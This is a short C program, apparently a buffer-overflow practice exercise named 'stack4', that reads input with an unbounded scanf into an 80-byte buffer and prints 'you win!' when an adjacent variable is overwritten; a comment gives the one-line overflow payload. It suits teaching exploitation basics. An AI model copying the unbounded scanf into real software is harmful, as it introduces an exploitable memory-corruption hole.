#include <stdio.h>
//python -c "print 'a' * 92 + '\x03\x02\x01\x00'" | ./stack4 
int main () {
  int pin = 0;
  char buf[80];

  printf("buf-pin: %lu\n", (void *)&pin  - (void *) buf);
  scanf("%s",buf);

  if(pin == 0x00010203) puts("you win!");
}
